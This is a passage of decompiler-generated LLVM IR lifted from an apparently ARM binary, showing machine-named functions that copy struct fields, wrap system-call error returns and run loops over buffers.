  %v2_162ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_162ec, i32* %r4.global-to-local, align 4
  ret i32 %v2_162d4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_162f4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_162f4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_16310 = inttoptr i32 %arg2 to i8*
  %v3_16310 = call i32 @function_135d0(i8* %v2_16310, i32 0)
  %v1_16314 = add i32 %tmp, 4
  %v2_16314 = inttoptr i32 %v1_16314 to i32*
  %v3_16314 = load i32, i32* %v2_16314, align 4
  %v2_16318 = load i32, i32* %arg1, align 4
  store i32 %v2_16318, i32* %r8.global-to-local, align 4
  %v1_1631c = load i32, i32* %r5.global-to-local, align 4
  %v2_1631c = add i32 %v1_1631c, 12
  %v3_1631c = inttoptr i32 %v2_1631c to i32*
  store i32 %v3_16314, i32* %v3_1631c, align 4
  %v0_16320 = load i32, i32* %r4.global-to-local, align 4
  %v1_16320 = add i32 %v0_16320, 20
  %v2_16320 = inttoptr i32 %v1_16320 to i32*
  %v3_16320 = load i32, i32* %v2_16320, align 4
  %v1_16324 = add i32 %v0_16320, 16
  %v2_16324 = inttoptr i32 %v1_16324 to i32*
  %v3_16324 = load i32, i32* %v2_16324, align 4
  store i32 %v3_16324, i32* %r6.global-to-local, align 4
  %v1_16328 = load i32, i32* %r5.global-to-local, align 4
  %v2_16328 = add i32 %v1_16328, 44
  %v3_16328 = inttoptr i32 %v2_16328 to i32*
  store i32 %v3_16320, i32* %v3_16328, align 4
  %v0_1632c = load i32, i32* %r4.global-to-local, align 4
  %v1_1632c = add i32 %v0_1632c, 24
  %v2_1632c = inttoptr i32 %v1_1632c to i32*
  %v3_1632c = load i32, i32* %v2_1632c, align 4
  %v1_16330 = load i32, i32* %r5.global-to-local, align 4
  %v2_16330 = add i32 %v1_16330, 48
  %v3_16330 = inttoptr i32 %v2_16330 to i32*
  store i32 %v3_1632c, i32* %v3_16330, align 4
  %v0_16334 = load i32, i32* %r4.global-to-local, align 4
  %v1_16334 = add i32 %v0_16334, 28
  %v2_16334 = inttoptr i32 %v1_16334 to i32*
  %v3_16334 = load i32, i32* %v2_16334, align 4
  %v1_16338 = load i32, i32* %r5.global-to-local, align 4
  %v2_16338 = add i32 %v1_16338, 52
  %v3_16338 = inttoptr i32 %v2_16338 to i32*
  store i32 %v3_16334, i32* %v3_16338, align 4
  %v0_1633c = load i32, i32* %r4.global-to-local, align 4
  %v1_1633c = add i32 %v0_1633c, 32
  %v1_16340 = inttoptr i32 %v1_1633c to i32*
  %v2_16340 = load i32, i32* %v1_16340, align 4
  %v3_16340 = add i32 %v0_1633c, 36
  %v4_16340 = inttoptr i32 %v3_16340 to i32*
  %v5_16340 = load i32, i32* %v4_16340, align 4
  store i32 %v5_16340, i32* %r1.global-to-local, align 4
  %v0_16344 = load i32, i32* %r5.global-to-local, align 4
  %v1_16344 = add i32 %v0_16344, 56
  %v1_16348 = inttoptr i32 %v1_16344 to i32*
  store i32 %v2_16340, i32* %v1_16348, align 4
  %v3_16348 = add i32 %v0_16344, 60
  %v4_16348 = inttoptr i32 %v3_16348 to i32*
  %v5_16348 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16348, i32* %v4_16348, align 4
  %v0_1634c = load i32, i32* %r4.global-to-local, align 4
  %v1_1634c = add i32 %v0_1634c, 40
  %v1_16350 = inttoptr i32 %v1_1634c to i32*
  %v2_16350 = load i32, i32* %v1_16350, align 4
  %v3_16350 = add i32 %v0_1634c, 44
  %v4_16350 = inttoptr i32 %v3_16350 to i32*
  %v5_16350 = load i32, i32* %v4_16350, align 4
  store i32 %v5_16350, i32* %r1.global-to-local, align 4
  %v0_16354 = load i32, i32* %r5.global-to-local, align 4
  %v1_16354 = add i32 %v0_16354, 64
  %v1_16358 = inttoptr i32 %v1_16354 to i32*
  store i32 %v2_16350, i32* %v1_16358, align 4
  %v3_16358 = add i32 %v0_16354, 68
  %v4_16358 = inttoptr i32 %v3_16358 to i32*
  %v5_16358 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16358, i32* %v4_16358, align 4
  %v0_1635c = load i32, i32* %r4.global-to-local, align 4
  %v1_1635c = add i32 %v0_1635c, 48
  %v1_16360 = inttoptr i32 %v1_1635c to i32*
  %v2_16360 = load i32, i32* %v1_16360, align 4
  %v3_16360 = add i32 %v0_1635c, 52
  %v4_16360 = inttoptr i32 %v3_16360 to i32*
  %v5_16360 = load i32, i32* %v4_16360, align 4
  store i32 %v5_16360, i32* %r1.global-to-local, align 4
  %v1_16364 = add i32 %v0_1635c, 8
  %v2_16364 = inttoptr i32 %v1_16364 to i16*
  %v3_16364 = load i16, i16* %v2_16364, align 2
  %v4_16364 = zext i16 %v3_16364 to i32
  store i32 %v4_16364, i32* %r2.global-to-local, align 4
  %v1_16368 = add i32 %v0_1635c, 10
  %v2_16368 = inttoptr i32 %v1_16368 to i16*
  %v3_16368 = load i16, i16* %v2_16368, align 2
  %v4_16368 = zext i16 %v3_16368 to i32
  store i32 %v4_16368, i32* %ip.global-to-local, align 4
  %v1_1636c = add i32 %v0_1635c, 12
  %v2_1636c = inttoptr i32 %v1_1636c to i16*
  %v3_1636c = load i16, i16* %v2_1636c, align 2
  %v4_1636c = zext i16 %v3_1636c to i32
  store i32 %v4_1636c, i32* %lr.global-to-local, align 4
  %v1_16370 = add i32 %v0_1635c, 14
  %v2_16370 = inttoptr i32 %v1_16370 to i16*
  %v3_16370 = load i16, i16* %v2_16370, align 2
  %v4_16370 = zext i16 %v3_16370 to i32
  store i32 %v4_16370, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1637c = load i32, i32* %r5.global-to-local, align 4
  %v1_1637c = add i32 %v0_1637c, 72
  %v1_16380 = inttoptr i32 %v1_1637c to i32*
  store i32 %v2_16360, i32* %v1_16380, align 4
  %v3_16380 = add i32 %v0_1637c, 76
  %v4_16380 = inttoptr i32 %v3_16380 to i32*
  %v5_16380 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16380, i32* %v4_16380, align 4
  %v0_16384 = load i32, i32* %r5.global-to-local, align 4
  %v1_16384 = inttoptr i32 %v0_16384 to i32*
  %v2_16384 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_16384, i32* %v1_16384, align 4
  %v3_16384 = add i32 %v0_16384, 4
  %v4_16384 = inttoptr i32 %v3_16384 to i32*
  %v5_16384 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_16384, i32* %v4_16384, align 4
  %v0_16388 = load i32, i32* %r6.global-to-local, align 4
  %v1_16388 = load i32, i32* %r5.global-to-local, align 4
  %v2_16388 = add i32 %v1_16388, 32
  %v3_16388 = inttoptr i32 %v2_16388 to i32*
  store i32 %v0_16388, i32* %v3_16388, align 4
  %v0_1638c = load i32, i32* %r7.global-to-local, align 4
  %v1_1638c = load i32, i32* %r5.global-to-local, align 4
  %v2_1638c = add i32 %v1_1638c, 36
  %v3_1638c = inttoptr i32 %v2_1638c to i32*
  store i32 %v0_1638c, i32* %v3_1638c, align 4
  %v0_16390 = load i32, i32* %r2.global-to-local, align 4
  %v1_16390 = load i32, i32* %r5.global-to-local, align 4
  %v2_16390 = add i32 %v1_16390, 16
  %v3_16390 = inttoptr i32 %v2_16390 to i32*
  store i32 %v0_16390, i32* %v3_16390, align 4
  %v0_16394 = load i32, i32* %ip.global-to-local, align 4
  %v1_16394 = load i32, i32* %r5.global-to-local, align 4
  %v2_16394 = add i32 %v1_16394, 20
  %v3_16394 = inttoptr i32 %v2_16394 to i32*
  store i32 %v0_16394, i32* %v3_16394, align 4
  %v0_16398 = load i32, i32* %lr.global-to-local, align 4
  %v1_16398 = load i32, i32* %r5.global-to-local, align 4
  %v2_16398 = add i32 %v1_16398, 24
  %v3_16398 = inttoptr i32 %v2_16398 to i32*
  store i32 %v0_16398, i32* %v3_16398, align 4
  %v0_1639c = load i32, i32* %r4.global-to-local, align 4
  %v1_1639c = load i32, i32* %r5.global-to-local, align 4
  %v2_1639c = add i32 %v1_1639c, 28
  %v3_1639c = inttoptr i32 %v2_1639c to i32*
  store i32 %v0_1639c, i32* %v3_1639c, align 4
  ret i32 %v2_16360

; uselistorder directives
  uselistorder i32 %v0_1635c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 68, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 60, { 3, 4, 1, 5, 6, 0, 2, 7 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @function_163ac() local_unnamed_addr {
dec_label_pc_163ac:
  %stack_var_-16 = alloca i32, align 4
  %v2_163b0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_163bc = call i32 @function_180e8(i32 7, i32 %v2_163b0)
  %v1_163c0 = icmp slt i32 %v2_163bc, 0
  %v5_163c4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_163c0, i32 256, i32 %v5_163c4
  ret i32 %storemerge
}

define i32 @function_163d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_163d8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163d8 = load i32, i32* @r7, align 4
  store i32 %v3_163d8, i32* %stack_var_-8, align 4
  %v0_163e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_163e4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_163e4, -4095
  br i1 %tmp, label %dec_label_pc_16404, label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163d8
  %v0_163f4 = call i32 @function_13574()
  %v0_163f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_163f8 = sub i32 0, %v0_163f8
  %v2_163fc = inttoptr i32 %v0_163f4 to i32*
  store i32 %v1_163f8, i32* %v2_163fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16404.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16404

dec_label_pc_16404:                               ; preds = %dec_label_pc_163d8, %dec_label_pc_163f4
  %v1_16408 = phi i32 [ %v0_163e4, %dec_label_pc_163d8 ], [ -1, %dec_label_pc_163f4 ]
  %v2_16404 = phi i32 [ %v3_163d8, %dec_label_pc_163d8 ], [ %v2_16404.pre, %dec_label_pc_163f4 ]
  store i32 %v2_16404, i32* @r7, align 4
  ret i32 %v1_16408

; uselistorder directives
  uselistorder i32 %v0_163e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16404, { 1, 0 }
}

define i32 @function_1640c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1640c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1640c = load i32, i32* @r7, align 4
  store i32 %v3_1640c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16434, label %dec_label_pc_16424

dec_label_pc_16424:                               ; preds = %dec_label_pc_1640c
  %v0_16424 = call i32 @function_13574()
  %v0_16428 = load i32, i32* %r7.global-to-local, align 4
  %v1_16428 = sub i32 0, %v0_16428
  %v2_1642c = inttoptr i32 %v0_16424 to i32*
  store i32 %v1_16428, i32* %v2_1642c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_16438.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %dec_label_pc_1640c, %dec_label_pc_16424
  %v2_16438 = phi i32 [ %v3_1640c, %dec_label_pc_1640c ], [ %v2_16438.pre, %dec_label_pc_16424 ]
  %v0_16434 = phi i32 [ %arg1, %dec_label_pc_1640c ], [ -1, %dec_label_pc_16424 ]
  store i32 %v2_16438, i32* @r7, align 4
  ret i32 %v0_16434

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16434, { 1, 0 }
}

define i32 @function_16440(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16440:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16474, label %dec_label_pc_16464

dec_label_pc_16464:                               ; preds = %dec_label_pc_16440
  %v0_16464 = call i32 @function_13574()
  %v0_16468 = load i32, i32* %r4.global-to-local, align 4
  %v1_16468 = sub i32 0, %v0_16468
  %v2_1646c = inttoptr i32 %v0_16464 to i32*
  store i32 %v1_16468, i32* %v2_1646c, align 4
  br label %dec_label_pc_16474

dec_label_pc_16474:                               ; preds = %dec_label_pc_16440, %dec_label_pc_16464
  %v1_1647c = phi i32 [ %arg1, %dec_label_pc_16440 ], [ -1, %dec_label_pc_16464 ]
  ret i32 %v1_1647c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16474, { 1, 0 }
}

define i32 @function_16480(i32 %arg1) local_unnamed_addr {
dec_label_pc_16480:
  %v1_16490 = load i32, i32* @r0, align 4
  ret i32 %v1_16490
}

define i32 @function_16494(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16494:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16494 = load i32, i32* @r7, align 4
  store i32 %v3_16494, i32* %stack_var_-8, align 4
  %v0_164a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164a0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164a0, -4095
  br i1 %tmp, label %dec_label_pc_164c0, label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %dec_label_pc_16494
  %v0_164b0 = call i32 @function_13574()
  %v0_164b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_164b4 = sub i32 0, %v0_164b4
  store i32 %v1_164b4, i32* @r3, align 4
  %v2_164b8 = inttoptr i32 %v0_164b0 to i32*
  store i32 %v1_164b4, i32* %v2_164b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %dec_label_pc_16494, %dec_label_pc_164b0
  %v1_164c4 = phi i32 [ %v0_164a0, %dec_label_pc_16494 ], [ -1, %dec_label_pc_164b0 ]
  %v2_164c0 = phi i32 [ %v3_16494, %dec_label_pc_16494 ], [ %v2_164c0.pre, %dec_label_pc_164b0 ]
  store i32 %v2_164c0, i32* @r7, align 4
  ret i32 %v1_164c4

; uselistorder directives
  uselistorder i32 %v0_164a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164c0, { 1, 0 }
}

define i32 @function_164c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_164c8:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164cc.outer

dec_label_pc_164cc.outer:                         ; preds = %dec_label_pc_164e4, %dec_label_pc_164c8
  %v0_164cc.ph = phi i32 [ %v0_164cc.pre.pre, %dec_label_pc_164e4 ], [ %arg1, %dec_label_pc_164c8 ]
  %tmp = icmp ult i32 %v0_164cc.ph, -4095
  br label %dec_label_pc_164cc

dec_label_pc_164cc:                               ; preds = %dec_label_pc_164cc.outer, %dec_label_pc_164cc
  br i1 %tmp, label %dec_label_pc_164cc, label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164cc
  %v0_164e4 = call i32 @function_13574()
  %v1_164e8 = sub i32 0, %v0_164cc.ph
  %v2_164ec = inttoptr i32 %v0_164e4 to i32*
  store i32 %v1_164e8, i32* %v2_164ec, align 4
  %v0_164cc.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164cc.outer

; uselistorder directives
  uselistorder i32 %v0_164cc.ph, { 1, 0 }
  uselistorder label %dec_label_pc_164cc, { 1, 0 }
}

define i32 @function_164f4(i32* %arg1) local_unnamed_addr {
dec_label_pc_164f4:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 135344, i32* @r6, align 4
  %v1_16508 = add i32 %tmp, 24
  store i32 %v1_16508, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_16520 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  store i32 %v4_16520, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16520)
  %v0_16534 = load i32, i32* @r6, align 4
  %v2_16534 = add i32 %v0_16534, 16
  %v3_16534 = inttoptr i32 %v2_16534 to i32*
  %v4_16534 = load i32, i32* %v3_16534, align 4
  store i32 %v4_16534, i32* %ip.global-to-local, align 4
  store i32 91456, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16534)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_16544

dec_label_pc_16544:                               ; preds = %dec_label_pc_16574, %dec_label_pc_164f4
  %v0_16544 = load i32, i32* @r5, align 4
  %v1_16544 = add i32 %v0_16544, 4
  %v2_16544 = inttoptr i32 %v1_16544 to i32*
  %v3_16544 = load i32, i32* %v2_16544, align 4
  %v4_16544 = add i32 %v0_16544, 8
  %v5_16544 = inttoptr i32 %v4_16544 to i32*
  %v6_16544 = load i32, i32* %v5_16544, align 4
  %tmp10 = icmp ugt i32 %v6_16544, %v3_16544
  br i1 %tmp10, label %dec_label_pc_16574, label %dec_label_pc_16550

dec_label_pc_16550:                               ; preds = %dec_label_pc_16544
  %v1_16550 = inttoptr i32 %v0_16544 to i32*
  %v2_16550 = load i32, i32* %v1_16550, align 4
  %v1_16554 = add i32 %v0_16544, 12
  %v2_16554 = inttoptr i32 %v1_16554 to i32*
  %v3_16554 = load i32, i32* %v2_16554, align 4
  %v1_16558 = add i32 %v0_16544, 20
  %v2_16558 = inttoptr i32 %v1_16558 to i32*
  %v3_16558 = load i32, i32* %v2_16558, align 4
  %v4_1655c = inttoptr i32 %v3_16554 to i32*
  %v5_1655c = call i32 @function_1811c(i32 %v2_16550, i32* %v4_1655c, i32 %v3_16558, i32 %v6_16544)
  %tmp9 = icmp slt i32 %v5_1655c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1656c

.thread:                                          ; preds = %dec_label_pc_16550
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_165a4

dec_label_pc_1656c:                               ; preds = %dec_label_pc_16550
  %v1_1656c = load i32, i32* @r5, align 4
  %v2_1656c = add i32 %v1_1656c, 8
  %v3_1656c = inttoptr i32 %v2_1656c to i32*
  store i32 %v5_1655c, i32* %v3_1656c, align 4
  %v0_16570 = load i32, i32* @r7, align 4
  %v1_16570 = load i32, i32* @r5, align 4
  %v2_16570 = add i32 %v1_16570, 4
  %v3_16570 = inttoptr i32 %v2_16570 to i32*
  store i32 %v0_16570, i32* %v3_16570, align 4
  %v0_16574.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16574

dec_label_pc_16574:                               ; preds = %dec_label_pc_16544, %dec_label_pc_1656c
  %v1_16598 = phi i32 [ %v0_16544, %dec_label_pc_16544 ], [ %v0_16574.pre, %dec_label_pc_1656c ]
  %v1_16574 = add i32 %v1_16598, 4
  %v2_16574 = inttoptr i32 %v1_16574 to i32*
  %v3_16574 = load i32, i32* %v2_16574, align 4
  %v1_16578 = add i32 %v1_16598, 12
  %v2_16578 = inttoptr i32 %v1_16578 to i32*
  %v3_16578 = load i32, i32* %v2_16578, align 4
  %v2_1657c = add i32 %v3_16578, %v3_16574
  store i32 %v2_1657c, i32* @r4, align 4
  %v3_16580 = inttoptr i32 %v2_1657c to i32*
  %v4_16580 = load i32, i32* %v3_16580, align 4
  %v1_16584 = add i32 %v2_1657c, 4
  %v2_16584 = inttoptr i32 %v1_16584 to i32*
  %v3_16584 = load i32, i32* %v2_16584, align 4
  %v1_16588 = add i32 %v2_1657c, 16
  %v2_16588 = inttoptr i32 %v1_16588 to i16*
  %v3_16588 = load i16, i16* %v2_16588, align 2
  %v4_16588 = zext i16 %v3_16588 to i32
  %v1_1658c = add i32 %v2_1657c, 8
  %v2_1658c = inttoptr i32 %v1_1658c to i32*
  %v3_1658c = load i32, i32* %v2_1658c, align 4
  store i32 %v3_1658c, i32* %ip.global-to-local, align 4
  %v2_16590 = add i32 %v4_16588, %v3_16574
  %v2_16594 = or i32 %v3_16584, %v4_16580
  %v4_16594 = icmp eq i32 %v2_16594, 0
  store i32 %v2_16590, i32* %v2_16574, align 4
  %v0_1659c = load i32, i32* %ip.global-to-local, align 4
  %v1_1659c = load i32, i32* @r5, align 4
  %v2_1659c = add i32 %v1_1659c, 16
  %v3_1659c = inttoptr i32 %v2_1659c to i32*
  store i32 %v0_1659c, i32* %v3_1659c, align 4
  br i1 %v4_16594, label %dec_label_pc_16544, label %dec_label_pc_165a4

dec_label_pc_165a4:                               ; preds = %dec_label_pc_16574, %.thread
  %v0_165b0 = load i32, i32* @r6, align 4
  %v2_165b0 = add i32 %v0_165b0, 24
  %v3_165b0 = inttoptr i32 %v2_165b0 to i32*
  %v4_165b0 = load i32, i32* %v3_165b0, align 4
  store i32 %v4_165b0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_165b0)
  %v0_165bc = load i32, i32* @r4, align 4
  ret i32 %v0_165bc

; uselistorder directives
  uselistorder i32 %v2_1657c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_16598, { 1, 0 }
  uselistorder i32 %v6_16544, { 1, 0 }
  uselistorder i32 %v0_16544, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_16574, { 1, 0 }
}

define i32 @function_165d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_165d0:
  %v0_165d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_165d0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_165d0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_165d0, %bb
  %v10_165dc = phi i32 [ %arg1, %dec_label_pc_165d0 ], [ 0, %bb ]
  ret i32 %v10_165dc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_165e0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_165e0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_165e0 = load i32, i32* @r4, align 4
  %v6_165e0 = load i32, i32* @r5, align 4
  %v9_165e0 = load i32, i32* @r6, align 4
  %v12_165e0 = load i32, i32* @r7, align 4
  %v15_165e0 = load i32, i32* @r8, align 4
  %v18_165e0 = load i32, i32* @sb, align 4
  %v21_165e0 = load i32, i32* @sl, align 4
  %v24_165e0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_165e4 = icmp eq i32* %arg1, null
  store i1 %v2_165e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_165e4, label %dec_label_pc_168f4, label %dec_label_pc_165fc

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165e0
  %v1_165fc = urem i32 %arg3, 256
  store i32 %v1_165fc, i32* @sb, align 4
  %v1_16600 = udiv i32 %arg3, 256
  %v3_16604 = urem i32 %v1_16600, 256
  %v3_16608 = mul nuw nsw i32 %v1_165fc, 4
  %v1_16610 = or i32 %v3_16608, 1
  %v1_1661c = and i32 %arg3, 131072
  %v1_16620 = add nsw i32 %v1_165fc, -1
  %v1_1662c = and i32 %arg3, 262144
  store i32 %v1_1662c, i32* %r2.global-to-local, align 4
  %v1_16630 = and i32 %arg3, 65536
  store i32 %v1_16630, i32* %r3.global-to-local, align 4
  store i32 %v1_16630, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_16640 = add i32 %arg4, 1
  store i32 %v1_16640, i32* @sl, align 4
  %v2_167c0 = inttoptr i32 %arg2 to i32*
  %v2_167d0 = icmp eq i32 %v1_1661c, 0
  %v2_16828 = icmp eq i32 %v1_1662c, 0
  br label %dec_label_pc_16644

dec_label_pc_16644:                               ; preds = %dec_label_pc_16644.backedge, %dec_label_pc_165fc
  %v2_16660 = phi i32 [ %v0_16644.pre, %dec_label_pc_16644.backedge ], [ %tmp, %dec_label_pc_165fc ]
  %v1_16644 = add i32 %v2_16660, 4
  %v2_16644 = inttoptr i32 %v1_16644 to i32*
  %v3_16644 = load i32, i32* %v2_16644, align 4
  store i32 %v3_16644, i32* %r3.global-to-local, align 4
  %v2_16648 = icmp eq i32 %v3_16644, 0
  store i1 %v2_16648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16648, label %dec_label_pc_16650, label %dec_label_pc_16698

dec_label_pc_16650:                               ; preds = %dec_label_pc_16644
  %v1_16650 = add i32 %v2_16660, 16
  %v2_16650 = inttoptr i32 %v1_16650 to i32*
  %v3_16650 = load i32, i32* %v2_16650, align 4
  store i32 %v3_16650, i32* %r3.global-to-local, align 4
  %v2_16654 = icmp eq i32 %v3_16650, 0
  store i1 %v2_16654, i1* %cpsr_z.global-to-local, align 1
  %v1_16658 = add i32 %v2_16660, 8
  %v2_16658 = inttoptr i32 %v1_16658 to i32*
  %v3_16658 = load i32, i32* %v2_16658, align 4
  store i32 %v3_16658, i32* %r3.global-to-local, align 4
  br i1 %v2_16654, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_16650
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_16650, align 4
  %v0_16664.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16650, %bb
  %v0_16664 = phi i32 [ %v0_16664.pre, %bb ], [ %v3_16658, %dec_label_pc_16650 ]
  %v2_16664 = icmp eq i32 %v0_16664, 0
  store i1 %v2_16664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16664, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_16610, i32* %r3.global-to-local, align 4
  %v2_1666c = load i32, i32* @r5, align 4
  %v3_1666c = add i32 %v2_1666c, 8
  %v4_1666c = inttoptr i32 %v3_1666c to i32*
  store i32 %v1_16610, i32* %v4_1666c, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_16670 = load i32, i32* @r5, align 4
  %v1_16670 = add i32 %v0_16670, 16
  %v2_16670 = inttoptr i32 %v1_16670 to i32*
  %v3_16670 = load i32, i32* %v2_16670, align 4
  store i32 %v3_16670, i32* %r0.global-to-local, align 4
  %v1_16674 = add i32 %v0_16670, 8
  %v2_16674 = inttoptr i32 %v1_16674 to i32*
  %v3_16674 = load i32, i32* %v2_16674, align 4
  store i32 %v3_16674, i32* %r3.global-to-local, align 4
  %v2_16678 = add i32 %v3_16674, %v3_16670
  store i32 %v2_16678, i32* @r0, align 4
  %v0_1667c = call i32 @function_13b88()
  store i32 %v0_1667c, i32* %r0.global-to-local, align 4
  %v2_16680 = icmp eq i32 %v0_1667c, 0
  store i1 %v2_16680, i1* %cpsr_z.global-to-local, align 1
  %v1_16684 = load i32, i32* @r5, align 4
  %v2_16684 = add i32 %v1_16684, 4
  %v3_16684 = inttoptr i32 %v2_16684 to i32*
  store i32 %v0_1667c, i32* %v3_16684, align 4
  br i1 %v2_16680, label %dec_label_pc_168f4, label %dec_label_pc_1668c

dec_label_pc_1668c:                               ; preds = %.thread
  %v0_1668c = load i32, i32* @r5, align 4
  %v1_1668c = add i32 %v0_1668c, 20
  %v2_1668c = inttoptr i32 %v1_1668c to i32*
  %v3_1668c = load i32, i32* %v2_1668c, align 4
  %v1_16690 = or i32 %v3_1668c, 1
  store i32 %v1_16690, i32* %r3.global-to-local, align 4
  store i32 %v1_16690, i32* %v2_1668c, align 4
